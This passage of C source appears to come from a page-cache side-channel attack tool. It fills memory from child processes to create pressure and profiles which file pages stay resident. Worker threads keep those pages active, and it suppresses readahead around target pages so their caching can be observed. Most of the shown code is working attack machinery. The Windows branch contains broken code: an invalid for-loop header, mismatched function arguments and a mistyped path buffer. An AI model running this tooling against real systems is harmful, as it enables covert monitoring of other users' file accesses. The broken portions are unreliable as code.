    dirty_mem = VirtualAlloc(NULL, bs->def_fillup_size_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (dirty_mem == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at VirtualAlloc\n", OSAL_EC));
        goto error;
    }

    // dirty memory with random content (no deduplication, compression)
    for (size_t offset = 0; offset < bs->def_fillup_size_; offset += PAGE_SIZE)
    {
        if (BCryptGenRandom(NULL, (BYTE *)dirty_mem + offset, PAGE_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != STATUS_SUCCESS)
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at BCryptGenRandom\n", OSAL_EC));
            goto error;
        }
    }
    // possibly missing random bytes (if size not multiple of PAGE_SIZE)
    size_t missing_random = bs->def_fillup_size_ % PAGE_SIZE;
    if (missing_random != 0 &&
        BCryptGenRandom(NULL, (BYTE *)dirty_mem + bs->def_fillup_size_ - missing_random, missing_random,
                        BCRYPT_USE_SYSTEM_PREFERRED_RNG) != STATUS_SUCCESS)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at BCryptGenRandom\n", OSAL_EC));
        goto error;
    }

    // signal that memory blocking was successful to parent process
    if (!ReleaseSemaphore(sem, 1, NULL))
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at ReleaseSemaphore\n", OSAL_EC));
        goto error;
    }

    // sleep forever
    Sleep(INFINITE);

error:
    if (sem != NULL)
    {
        CloseHandle(sem);
    }
    if (dirty_mem != NULL)
    {
        VirtualFree(dirty_mem, 0, MEM_RELEASE);
    }

    return -1;
}
#endif

int releaseRAMCb(void *addr, void *arg)
{
    FillUpProcess *fp = addr;
    size_t *released = arg;

    osal_process_kill(fp->pid_);
    *released = fp->fillup_size_;

    return 0;
}

void releaseRAM(AttackBlockingSet *bs, size_t release_size)
{
    size_t released = 0;
    size_t released_sum = 0;

    DEBUG_PRINT((DEBUG INFO BS_TAG "Trying to release %zu kB of blocking memory\n", release_size / 1024));

    while (released_sum < release_size && bs->fillup_processes_.size_ > 0)
    {
        dynArrayPop(&bs->fillup_processes_, releaseRAMCb, &released);
        released_sum += released;
    }
    DEBUG_PRINT((DEBUG INFO BS_TAG "Released %zu kB...\n", released_sum / 1024));
}

/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK WORKING SET
 */

#ifdef __linux
int profileAttackWorkingSet(Attack *attack)
{
    int ret = 0;
    FTS *fts_handle = NULL;
    FTSENT *current_ftsent = NULL;

    // use fts to traverse over all files in the given search paths
    // triggers caching of some files
    fts_handle = fts_open(attack->working_set_.search_paths_, FTS_PHYSICAL, NULL);
    if (fts_handle == NULL)
    {
        DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at fts_open...\n", OSAL_EC));
        return -1;
    }

    while (1)
    {
        current_ftsent = fts_read(fts_handle);
        // error at traversing files
        if (current_ftsent == NULL && errno)
        {
            // catch too many open files error (end gracefully)
            if (errno == EMFILE)
            {
                DEBUG_PRINT((DEBUG WS_TAG WARNING "Too many open files at fts_read, ignoring rest of files...\n"));
                break;
            }

            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at fts_read...\n", OSAL_EC));
            goto error;
        }
        // end
        else if (current_ftsent == NULL)
        {
            break;
        }

        // regular file
        if (current_ftsent->fts_info == FTS_F)
        {
            // if failed for one file ignore and just try the next one
            if (initialProfileResidentPagesFile(attack, current_ftsent->fts_path) != 0)
            {
                DEBUG_PRINT((DEBUG WS_TAG WARNING "Error " OSAL_EC_FS " at initialProfileResidentPagesFile, ignoring...\n", OSAL_EC));
            }
        }
    }

    goto cleanup;
error:
    ret = -1;
    listDestroy(&attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_], closeCachedFile);

cleanup:
    fts_close(fts_handle);

    return ret;
}
#elif defined(_WIN32)
int profileAttackWorkingSet(Attack *attack)
{
    int ret = 0;

    for (size_t i < 0; attack->working_set_.search_paths_[i] != NULL; i++)
    {
        if (profileAttackWorkingSetFolder(attack, attack->working_set_.search_paths_[i], inactive_list_set) != 0)
        {
            goto error;
        }
    }

    return 0;

error:
    ret = -1;
    listDestroy(&attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_], closeCachedFile);

    return ret;
}

int profileAttackWorkingSetFolder(Attack *attack, char *folder)
{
    char *full_pattern[OSAL_MAX_PATH_LEN];
    WIN32_FIND_DATA find_file_data;
    HANDLE handle;

    // go through all files and subdirectories
    PathCombineA(full_pattern, folder, "*");
    handle = FindFirstFileA(full_pattern, &find_file_data);
    if (handle == INVALID_HANDLE_VALUE)
    {
        if (GetLastError() == FAIL_FILE_NOT_FOUND)
        {
            return 0;
        }

        return -1;
    }

    do
    {
        PathCombineA(full_pattern, folder, find_file_data.cFileName);
        if (find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            if (profileAttackWorkingSetFolder(attack, full_pattern, pattern) != 0)
            {
                return -1;
            }
        }
        else
        {
            if (initialProfileResidentPagesFile(attack, full_pattern) != 0)
            {
                DEBUG_PRINT((DEBUG WS_TAG WARNING "Error " OSAL_EC_FS " at initialProfileResidentPagesFile, ignoring...\n", OSAL_EC));
            }
        }
    } while (FindNextFile(handle, &find_file_data));

    FindClose(handle);
    return 0;
}
#endif

int initialProfileResidentPagesFile(Attack *attack, char *file_path)
{
    char file_path_abs[OSAL_MAX_PATH_LEN];
    CachedFile current_cached_file;
    TargetFile *target_file = NULL;
    uint8_t one = 1;
    uint8_t *already_scanned = NULL;

    // get absolute path
    if (osal_fullpath(file_path, file_path_abs) == NULL)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at osal_fullpath...\n", OSAL_EC));
        return -1;
    }
    DEBUG_PRINT((DEBUG WS_TAG INFO "Found potential cached object: %s\n", file_path_abs));

    // check if the found file matches the eviction file, if so skip
    if (attack->eviction_set_.eviction_file_path_abs_ != NULL && 
        strcmp(file_path_abs, attack->eviction_set_.eviction_file_path_abs_) == 0)
    {
        DEBUG_PRINT((DEBUG WS_TAG INFO "Potential cached object %s is the eviction file, skipping...\n", file_path_abs));
        return -1;
    }

    // check if potential cached object matches a target
    target_file = hashMapGet(&attack->targets_, file_path_abs, strlen(file_path_abs));
    // matches a target file and the whole file is the target, skip
    if (target_file != NULL && target_file->is_target_file_)
    {
        DEBUG_PRINT((DEBUG WS_TAG INFO "Whole potential cached object %s is a target, skipping...\n", file_path_abs));
        return -1;
    }

    // check if we added the potential cached object already
    already_scanned = hashMapGet(&attack->working_set_.scan_added_files_set_, file_path_abs, strlen(file_path_abs));
    if(already_scanned != NULL)
    {
        DEBUG_PRINT((DEBUG WS_TAG INFO "Potential cached object %s was already scanned, skipping...\n", file_path_abs));
        return -1;    
    }

    // prepare cached file object
    initCachedFile(&current_cached_file);
    // open file, do not update access time (faster), skip in case of errors
    if (mapFile(&current_cached_file.mapping_, file_path_abs, FILE_ACCESS_READ | FILE_NOATIME, MAPPING_ACCESS_READ | MAPPING_ACCESS_EXECUTE | MAPPING_SHARED) != 0)
    {
        DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at mapFile: %s...\n", OSAL_EC, file_path_abs));
        goto error;
    }
    // advise random access to avoid readahead (we dont want to change the working set)
    if (adviseFileUsage(&current_cached_file.mapping_, 0, 0, USAGE_RANDOM) != 0)
    {
        DEBUG_PRINT((DEBUG WS_TAG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
    }

    // get status of the file pages
    if (getCacheStatusFile(&current_cached_file.mapping_) != 0)
    {
        DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at getCacheStatusFile...\n", OSAL_EC));
        goto error;
    }
    //memset(current_cached_file.mapping_.pages_cache_status_, 1, current_cached_file.mapping_.size_pages_);

    // if file is a target file, zero pages which could trigger the readahead of the target pages
    if (target_file != NULL)
    {
        // save link to target file
        current_cached_file.linked_target_file_ = target_file;
        if (target_file->has_target_pages_)
        {
            targetPagesCacheStatusReadaheadTriggerPagesSet(&current_cached_file.linked_target_file_->target_pages_,
                                                           &current_cached_file.mapping_, attack->fa_window_size_pages_, 0);
            targetPagesCacheStatusSet(&current_cached_file.linked_target_file_->target_pages_,
                                      &current_cached_file.mapping_, 0);
        }
        else if (target_file->has_target_sequence_)
        {
            targetSequenceCacheStatusReadaheadTriggerPagesSet(&current_cached_file.linked_target_file_->target_sequence_,
                                                              &current_cached_file.mapping_, attack->fa_window_size_pages_, 0);
            targetSequenceCacheStatusSet(&current_cached_file.linked_target_file_->target_sequence_,
                                         &current_cached_file.mapping_, 0);
        }
        // TODO FIXME target sequences are currently not supported here (was not needed)
    }

    // parse page sequences, skip in case of errors
    if (cachedFileProfileResidentPageSequences(&current_cached_file, attack->working_set_.ps_add_threshold_) != 0)
    {
        DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at cachedFileProfileResidentPageSequences for file: %s...\n", OSAL_EC, file_path_abs));
        goto error;
    }

    // no page sequences -> close object
    if (current_cached_file.resident_page_sequences_.size_ == 0)
    {
        closeCachedFile(&current_cached_file);
    }
    // else add current cached file to cached files
    else
    {
        // cleanup
        if (attack->working_set_.use_file_api_)
        {
            closeMappingOnly(&current_cached_file.mapping_);
        }
        else
        {
            closeFileOnly(&current_cached_file.mapping_);
        }

        // skip in case of errors
        if (!listAppendBack(&attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_],
                            &current_cached_file))
        {
            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at listAppendBack for file: %s...\n", OSAL_EC, file_path_abs));
            goto error;
        }

        // remember that the file was added
        if(hashMapInsert(&attack->working_set_.scan_added_files_set_, file_path_abs, strlen(file_path_abs), &one) == NULL)
        {
            // pop node again (error occured)
            listPopNode(&attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_], 
                attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].tail_);
            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at hashMapInsert for file: %s...\n", OSAL_EC, file_path_abs));
            goto error;
        }

        /*printf("%s\n", file_path_abs);
        for(size_t i = 0; i < current_cached_file.resident_page_sequences_.size_; i++)
        {
            PageSequence *seq = ((PageSequence *) current_cached_file.resident_page_sequences_.data_) + i;
            printf("%zu - %zu\n", seq->offset_, seq->offset_ + seq->length_ - 1);
        }
        printf("\n");*/
    }

    // statistics
    attack->working_set_.checked_files_++;
    attack->working_set_.memory_checked_ += current_cached_file.mapping_.size_;
    attack->working_set_.mem_in_ws_[attack->working_set_.up_to_date_list_set_] += current_cached_file.resident_memory_;

    return 0;

error:
    closeCachedFile(&current_cached_file);
    return -1;
}

void targetPagesCacheStatusReadaheadTriggerPagesSet(DynArray *target_pages, FileMapping *target_file_mapping,
                                                    size_t fa_window_size_pages, uint8_t val)
{
    for (size_t t = 0; t < target_pages->size_; t++)
    {
        TargetPage *target_page = dynArrayGet(target_pages, t);
        targetPageCacheStatusReadaheadTriggerPagesSet(target_page->offset_, target_file_mapping,
                                                      fa_window_size_pages, val);
    }
}

void targetPageCacheStatusReadaheadTriggerPagesSet(size_t offset, FileMapping *target_file_mapping,
                                                   size_t fa_window_size_pages, uint8_t val)
{
    targetPageCacheStatusReadaheadTriggerPagesBackSet(offset, target_file_mapping,
                                                      fa_window_size_pages, val);
    targetPageCacheStatusReadaheadTriggerPagesFrontSet(offset, target_file_mapping,
                                                       fa_window_size_pages, val);
}

void targetPageCacheStatusReadaheadTriggerPagesBackSet(size_t offset, FileMapping *target_file_mapping,
                                                       size_t fa_window_size_pages, uint8_t val)
{
    size_t back_ra_trigger_window = fa_window_size_pages / 2 - 1;

    // trim pages in back that could trigger readahead
    if (offset < fa_window_size_pages)
    {
        for (ssize_t p = offset - 1; p >= 0; p--)
            target_file_mapping->pages_cache_status_[p] = val;
    }
    else
    {
        for (ssize_t p = offset - 1; p >= offset - back_ra_trigger_window; p--)
            target_file_mapping->pages_cache_status_[p] = val;
    }
}

void targetPageCacheStatusReadaheadTriggerPagesFrontSet(size_t offset, FileMapping *target_file_mapping,
                                                        size_t fa_window_size_pages, uint8_t val)
{
    // TODO at least for linux
    size_t front_ra_trigger_window = fa_window_size_pages / 2;

    // trim pages in front that could trigger readahead
    for (ssize_t p = offset + 1; p <= MIN(offset + front_ra_trigger_window, target_file_mapping->size_pages_ - 1); p++)
        target_file_mapping->pages_cache_status_[p] = val;
}

void targetPagesCacheStatusSet(DynArray *target_pages, FileMapping *target_file_mapping, uint8_t val)
{
    for (size_t t = 0; t < target_pages->size_; t++)
    {
        TargetPage *target_page = dynArrayGet(target_pages, t);
        target_file_mapping->pages_cache_status_[target_page->offset_] = val;
    }
}

void targetSequenceCacheStatusReadaheadTriggerPagesSet(PageSequence *target_sequence, FileMapping *target_file_mapping,
                                                       size_t fa_window_size_pages, uint8_t val)
{
    targetPageCacheStatusReadaheadTriggerPagesBackSet(target_sequence->offset_, target_file_mapping,
                                                      fa_window_size_pages, val);
    targetPageCacheStatusReadaheadTriggerPagesFrontSet(target_sequence->offset_ + target_sequence->length_ - 1, target_file_mapping,
                                                       fa_window_size_pages, val);
}

void targetSequenceCacheStatusSet(PageSequence *target_sequence, FileMapping *target_file_mapping, uint8_t val)
{
    for (size_t p = target_sequence->offset_; p < (target_sequence->offset_ + target_sequence->length_); p++)
    {
        target_file_mapping->pages_cache_status_[p] = val;
    }
}

int cachedFileProfileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold)
{
    ssize_t resident_pages = 0;

    // reset array size to zero
    dynArrayReset(&current_cached_file->resident_page_sequences_);
    // reset resident memory
    current_cached_file->resident_memory_ = 0;

    // profile page sequences
    resident_pages = fileMappingProfileResidentPageSequences(&current_cached_file->mapping_, ps_add_threshold,
                                                             &current_cached_file->resident_page_sequences_);
    if (resident_pages == -1)
    {
        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at fileMappingProfileResidentPageSequences...\n", OSAL_EC));
        dynArrayDestroy(&current_cached_file->resident_page_sequences_, NULL);
        current_cached_file->resident_memory_ = 0;
        return -1;
    }

    // save resident memory of file
    current_cached_file->resident_memory_ = resident_pages * PAGE_SIZE;
    return 0;
}

ssize_t fileMappingProfileResidentPageSequences(FileMapping *mapping, size_t ps_add_threshold,
                                                DynArray *resident_page_sequences)
{
    PageSequence sequence = {0};
    size_t resident_pages = 0;

    // check for sequences and add them
    for (size_t p = 0; p < mapping->size_pages_; p++)
    {
        if (mapping->pages_cache_status_[p] & 1)
        {
            if (sequence.length_ == 0)
            {
                sequence.offset_ = p;
            }

            sequence.length_++;
        }
        else
        {
            // add sequence if greater equal than threshold
            if (sequence.length_ >= ps_add_threshold)
            {
                // add sequence pages
                if (!dynArrayAppend(resident_page_sequences, &sequence))
                {
                    DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
                    goto error;
                }

                resident_pages += sequence.length_;
                DEBUG_PRINT((DEBUG INFO "Added page sequence with page offset %zu and %zu pages\n",
                             sequence.offset_, sequence.length_));
                // reset sequence length
                sequence.length_ = 0;
            }
        }
    }
    // process last found sequence
    if (sequence.length_ >= ps_add_threshold)
    {
        // add sequence pages
        if (!dynArrayAppend(resident_page_sequences, &sequence))
        {
            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
            goto error;
        }

        resident_pages += sequence.length_;
        DEBUG_PRINT((DEBUG INFO "Added page sequence with page offset %zu and %zu pages\n",
                     sequence.offset_, sequence.length_));
    }

    return resident_pages;
error:
    return -1;
}

size_t activateWS(ListNode *resident_files_start, size_t resident_files_count, Attack *attack)
{
    CachedFile *current_cached_file = NULL;
    ListNode *resident_files_node = resident_files_start;
    size_t accessed_files_count = 0;
    size_t accessed_pages = 0;
    PageSequence *page_sequences = NULL;
    size_t page_sequences_length = 0;
    volatile uint8_t tmp = 0;
    (void)tmp;

    while (resident_files_node != NULL && accessed_files_count < resident_files_count)
    {
        current_cached_file = (CachedFile *)resident_files_node->data_;

        page_sequences = current_cached_file->resident_page_sequences_.data_;
        // align to readahead size
        page_sequences_length = current_cached_file->resident_page_sequences_.size_; 

        for (size_t s = 0; s < page_sequences_length; s++)
        {
#ifdef __linux
            // try to avoid readahead as much as possible
            // start in middle of window and work way out
            for (size_t p = page_sequences[s].offset_; p < page_sequences[s].offset_ + page_sequences[s].length_; p++)
            {
                // trigger potential readahead by accessing page in middle of readahead window
                /*if (p % attack->fa_window_size_pages_ == 0)
                {
                    fileMappingActivate(&current_cached_file->mapping_, (page_sequences[s].offset_ + p + attack->fa_window_size_pages_ / 2) * PAGE_SIZE, attack->working_set_.use_file_api_);
                }*/
                // activate
                fileMappingActivate(&current_cached_file->mapping_, p * PAGE_SIZE, attack->working_set_.use_file_api_);
                accessed_pages++;
            }
#elif defined(_WIN32)
                    // TODO implement
#endif
        }
        accessed_files_count++;
        resident_files_node = resident_files_node->next_;
    }

    // drain
    //posix_fadvise(current_cached_file->mapping_.internal_.fd_, 0, PAGE_SIZE, POSIX_MADV_DONTNEED);

    return accessed_pages * PAGE_SIZE;
}

void *wsManagerThread(void *arg)
{
    Attack *attack = arg;
    AttackWorkingSet *ws = &attack->working_set_;
    size_t runs_since_last_profile_update = 0;
    void *ret = NULL;

    // if access thread count is zero, stop operation as senseless
    if (ws->access_thread_count_ == 0)
    {
        return NULL;
    }

    //  reserve space for access thread data structures
    if (dynArrayResize(&ws->access_threads_, ws->access_thread_count_) == NULL)
    {
        DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at dynArrayResize...\n", OSAL_EC));
        goto error;
    }
    for (size_t t = 0; t < ws->access_thread_count_; t++)
    {
        // initialise access thread data structures
        initPageAccessThreadWSData(dynArrayGet(&ws->access_threads_, t));
    }

    // spin up worker threads
    for (size_t t = 0; t < ws->access_thread_count_; t++)
    {
        PageAccessThreadWSData *thread_data = dynArrayGet(&ws->access_threads_, t);

        thread_data->attack_ = attack;
        thread_data->id_ = t;
        thread_data->running_ = 1;
        thread_data->sleep_time_us_ = ws->access_sleep_time_us_;
        if (pthread_create(&thread_data->tid_, NULL, pageAccessThreadWS, thread_data) != 0)
        {
            thread_data->running_ = 0;
            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
            goto error;
        }
    }

    while (__atomic_load_n(&ws->running_, __ATOMIC_RELAXED))
    {
        DEBUG_PRINT((DEBUG WS_TAG INFO "WS manager thread running.\n"));

        // update ws profile
        if (ws->profile_update_all_x_evaluations_ != 0 && runs_since_last_profile_update == ws->profile_update_all_x_evaluations_)
        {
            DEBUG_PRINT((DEBUG WS_TAG INFO "Launching profile update - not implemented.\n"));
            // TODO FIXME maybe interesting in future
            // make new profile
            runs_since_last_profile_update = 0;
        }

        // reevaluate working set
        DEBUG_PRINT((DEBUG WS_TAG INFO "Reevaluating working set...\n"));
        // reevaluateWorkingSet fails if eviction was run during the reevaluation
        // in case of an error the original (current) lists are not changed
        if (ws->evaluation_ && reevaluateWorkingSet(attack) == 0)
        {
            // switch to newly profiled ws lists
            pthread_rwlock_wrlock(&ws->ws_lists_lock_);
            ws->up_to_date_list_set_ ^= 1;
            pthread_rwlock_unlock(&ws->ws_lists_lock_);
            DEBUG_PRINT((DEBUG WS_TAG INFO "Rescanned working set now consists of %zu files (%zu bytes mapped).\n",
                         ws->resident_files_[ws->up_to_date_list_set_].count_,
                         ws->mem_in_ws_[ws->up_to_date_list_set_]));
        }

        runs_since_last_profile_update++;
        osal_sleep_us(ws->evaluation_sleep_time_us_);
    }

    goto cleanup;

error:
    ret = (void *)-1;

cleanup:
    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);

    return ret;
}

void *pageAccessThreadWS(void *arg)
{
    PageAccessThreadWSData *thread_data = arg;
    Attack *attack = thread_data->attack_;
    AttackWorkingSet *ws = &attack->working_set_;
    size_t current_ws_list_set = -1;
    ListNode *resident_files_start = NULL;
    size_t resident_files_count = 0;
    size_t accessed_memory = 0;
    (void)accessed_memory;

    DEBUG_PRINT((DEBUG WS_TAG WORKER_TAG INFO "Worker thread started.\n", pthread_self()));
    while (__atomic_load_n(&thread_data->running_, __ATOMIC_RELAXED))
    {
        // access current working set
        pthread_rwlock_rdlock(&ws->ws_lists_lock_);
        if (current_ws_list_set != ws->up_to_date_list_set_)
        {
            current_ws_list_set = ws->up_to_date_list_set_;
            // round up to cover every file
            resident_files_count = (ws->resident_files_[current_ws_list_set].count_ + ws->access_thread_count_ - 1) /
                                   ws->access_thread_count_;
            resident_files_start = listGetIndex(&ws->resident_files_[current_ws_list_set],
                                                thread_data->id_ * resident_files_count);
            DEBUG_PRINT((DEBUG WS_TAG WORKER_TAG INFO "Worker thread reconfigured to access %zu files beginning with resident files node: %p.\n",
                         pthread_self(), resident_files_count, (void *)resident_files_start));
        }
        accessed_memory = activateWS(resident_files_start, resident_files_count,
                                     attack);
        pthread_rwlock_unlock(&ws->ws_lists_lock_);

        /*DEBUG_PRINT((DEBUG WS_TAG WORKER_TAG INFO "Worker thread (resident files head: %p) accessed %zu kB memory.\n",
                     pthread_self(), (void *)resident_files_start, accessed_memory / 1024));*/

        // sleep for awhile
        osal_sleep_us(thread_data->sleep_time_us_);
    }
    DEBUG_PRINT((DEBUG WS_TAG WORKER_TAG INFO "Worker thread stopped.\n", pthread_self()));

    return NULL;
}

int reevaluateWorkingSet(Attack *attack)
{
    AttackWorkingSet *ws = &attack->working_set_;
    // get current inactive list set
    size_t inactive_list_set = ws->up_to_date_list_set_ ^ 1;
    // free inactive list
    listDestroy(&ws->resident_files_[inactive_list_set], closeCachedFileResidentPageSequencesOnly);
    listDestroy(&ws->non_resident_files_[inactive_list_set], closeCachedFileResidentPageSequencesOnly);
    ws->mem_in_ws_[inactive_list_set] = 0;

    // reevaluate resident files list
    // in case of an error the original lists are not changed
    if (reevaluateWorkingSetList(&ws->resident_files_[ws->up_to_date_list_set_], attack, inactive_list_set) < 0)
    {
        return -1;
    }
    // reevaluate non resident files list
    // in case of an error the original lists are not changed
    if (reevaluateWorkingSetList(&ws->non_resident_files_[ws->up_to_date_list_set_], attack, inactive_list_set) < 0)
    {
        return -1;
    }

    return 0;
}

int reevaluateWorkingSetList(List *cached_file_list, Attack *attack, size_t inactive_list_set)
{
    int ret = 0;
    AttackWorkingSet *ws = &attack->working_set_;
    ListNode *current_cached_file_node = NULL;
    CachedFile *current_cached_file = NULL;
    ListNode *next_node = NULL;
    CachedFile current_cached_file_copy = {0};

    // go cached files list
    current_cached_file_node = cached_file_list->head_;
    while (current_cached_file_node != NULL)
    {
        next_node = current_cached_file_node->next_;
        current_cached_file = current_cached_file_node->data_;

        // copy current cached file and create a new dynarray
        // the copy ensures that the current state is not changed but kept
        current_cached_file_copy = *current_cached_file;
        if (!dynArrayInit(&current_cached_file_copy.resident_page_sequences_, sizeof(PageSequence), FCA_ARRAY_INIT_CAP))
        {
            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at dynArrayInit...\n", OSAL_EC));
            goto error;
        }

        // reevaluate file
        // try remap (might be neccessary), name should not be necessary as already opened
        if (mapFile(&current_cached_file_copy.mapping_, "", FILE_ACCESS_READ | FILE_NOATIME, MAPPING_ACCESS_READ | MAPPING_ACCESS_EXECUTE | MAPPING_SHARED) != 0)
        {
            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at mapFile...\n", OSAL_EC));
            goto error;
        }
        // page cache status array might have changed 
        // copy back to keep valid state in case of an error
        current_cached_file->mapping_.pages_cache_status_ = current_cached_file_copy.mapping_.pages_cache_status_;
        // advise random access to avoid readahead (we dont want to change the working set)
        if (adviseFileUsage(&current_cached_file_copy.mapping_, 0, 0, USAGE_RANDOM) != 0)
        {
            DEBUG_PRINT((DEBUG WS_TAG WARNING "Error " OSAL_EC_FS " at adviseFileUsage...\n", OSAL_EC));
        }

        // get status of the file pages
        if (getCacheStatusFile(&current_cached_file_copy.mapping_) != 0)
        {
            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at getCacheStatusFile...\n", OSAL_EC));
            goto error;
        }
        // if file is a target file, zero pages inside the target pages readahead window
        if (current_cached_file_copy.linked_target_file_ != NULL)
        {
            if (current_cached_file_copy.linked_target_file_->has_target_pages_)
            {
                targetPagesCacheStatusReadaheadTriggerPagesSet(&current_cached_file_copy.linked_target_file_->target_pages_,
                                                               &current_cached_file_copy.mapping_, attack->fa_window_size_pages_, 0);
                targetPagesCacheStatusSet(&current_cached_file_copy.linked_target_file_->target_pages_,
                                          &current_cached_file_copy.mapping_, 0);
            }
            else if (current_cached_file_copy.linked_target_file_->has_target_sequence_)
            {
                targetSequenceCacheStatusReadaheadTriggerPagesSet(&current_cached_file_copy.linked_target_file_->target_sequence_,
                                                                  &current_cached_file_copy.mapping_, attack->fa_window_size_pages_, 0);
                targetSequenceCacheStatusSet(&current_cached_file_copy.linked_target_file_->target_sequence_,
                                             &current_cached_file_copy.mapping_, 0);
            }
        }
        // parse page sequences, skip in case of errors
        if (cachedFileProfileResidentPageSequences(&current_cached_file_copy, ws->ps_add_threshold_) != 0)
        {
            DEBUG_PRINT((DEBUG WS_TAG FAIL "Error " OSAL_EC_FS " at cachedFileProfileResidentPageSequences...\n", OSAL_EC));
            goto error;
        }

        // eviction is running stop
        if (ws->eviction_ignore_evaluation_ && __atomic_load_n(&eviction_running, __ATOMIC_RELAXED) == 1)
        {
            DEBUG_PRINT((DEBUG WS_TAG WARNING "Eviction occured during reevaluation, ignoring result...\n"));
            goto error;
        }

        // unmap if wanted
        if(attack->working_set_.use_file_api_)
        {
            closeMappingOnly(&current_cached_file_copy.mapping_);
        }

        // move to right list
        if (current_cached_file_copy.resident_memory_ == 0)
        {
            listAppendBack(&ws->non_resident_files_[inactive_list_set], &current_cached_file_copy);
        }
        else
        {
            listAppendBack(&ws->resident_files_[inactive_list_set], &current_cached_file_copy);
            ws->mem_in_ws_[inactive_list_set] += current_cached_file_copy.resident_memory_;
        }

        current_cached_file_node = next_node;
    }

    goto cleanup;
error:
    ret = -1;
    dynArrayDestroy(&current_cached_file_copy.resident_page_sequences_, NULL);

cleanup:
    if(attack->working_set_.use_file_api_)
    {
        closeMappingOnly(&current_cached_file_copy.mapping_);
    }

    return ret;
}

/*-----------------------------------------------------------------------------
 * FUNCTIONS RELATED TO ATTACK SUPPRESS SET
 */

int prepareSuppressSet(Attack *attack)
{
    // goes through target files and adds all pages which could trigger an readahead of the target
    // these are kept active in an attempt to avoid a readahead of the target
    if (hashMapForEach(&attack->targets_, targetsHmPrepareSuppressSet, attack) != HM_FE_OK)
    {
        DEBUG_PRINT((DEBUG SS_TAG FAIL "Error " OSAL_EC_FS " at hashMapForEach...\n", OSAL_EC));
        dynArrayDestroy(&attack->suppress_set_.suppress_set_, closeTargetFileTargetsOnly);
        return -1;
    }

    return 0;
}

int targetsHmPrepareSuppressSet(void *data, void *arg)
{
    Attack *attack = arg;
    TargetFile *target_file = data;
    // copy of target file
    TargetFile target_file_suppress = *target_file;

    DEBUG_PRINT((DEBUG SS_TAG INFO "Processing target file: %s...\n", target_file->file_path_abs_));

    // if whole file is target we can not suppress
    if (target_file->is_target_file_)
    {
        DEBUG_PRINT((DEBUG SS_TAG INFO "Whole file is a target, skipping...\n"));
        return HM_FE_OK;
    }

    // init suppress page sequences array
    dynArrayInit(&target_file_suppress.target_sequences_, sizeof(PageSequence), 0);
    target_file_suppress.flags_ = 0;
    target_file_suppress.has_target_sequences_ = 1;

    // allocate memory for cache status array, set pages which could trigger readeahead to 1
    if (target_file->mapping_.pages_cache_status_ == NULL)
    {
        target_file->mapping_.pages_cache_status_ = malloc(target_file_suppress.mapping_.size_pages_ * sizeof(unsigned char));
        if (target_file->mapping_.pages_cache_status_ == NULL)
        {
            DEBUG_PRINT((DEBUG SS_TAG FAIL "Error " OSAL_EC_FS " at malloc...\n", OSAL_EC));
            goto error;
        }
    }
    // zero out
    memset(target_file->mapping_.pages_cache_status_, 0, target_file->mapping_.size_pages_ * sizeof(unsigned char));

    // set pages which would trigger readahead to 1
    if (target_file->has_target_pages_)
    {
        targetPagesCacheStatusReadaheadTriggerPagesSet(&target_file->target_pages_,
                                                       &target_file->mapping_, attack->fa_window_size_pages_, 1);
        targetPagesCacheStatusSet(&target_file->target_pages_,
                                  &target_file->mapping_, 0);
    }
    else if (target_file->has_target_sequence_)
    {
        targetSequenceCacheStatusReadaheadTriggerPagesSet(&target_file->target_sequence_,
                                                          &target_file->mapping_, attack->fa_window_size_pages_, 1);
        targetSequenceCacheStatusSet(&target_file->target_sequence_,
                                     &target_file->mapping_, 0);
    }

    // add page sequences
    if (fileMappingProfileResidentPageSequences(&target_file->mapping_, 1, &target_file_suppress.target_sequences_) == -1)
    {
        DEBUG_PRINT((DEBUG SS_TAG FAIL "Error " OSAL_EC_FS " at fileMappingProfileResidentPageSequences...\n", OSAL_EC));
        goto error;
    }

    if (dynArrayAppend(&attack->suppress_set_.suppress_set_, &target_file_suppress) == NULL)
    {
        DEBUG_PRINT((DEBUG SS_TAG FAIL "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
        goto error;
    }

    return HM_FE_OK;
error:
    closeTargetFileTargetsOnly(&target_file_suppress);
    return -1;
}

int spawnSuppressThreads(Attack *attack)
{
    PageAccessThreadSSData *thread_data = NULL;
    PageAccessThreadSSData thread_data_template = {
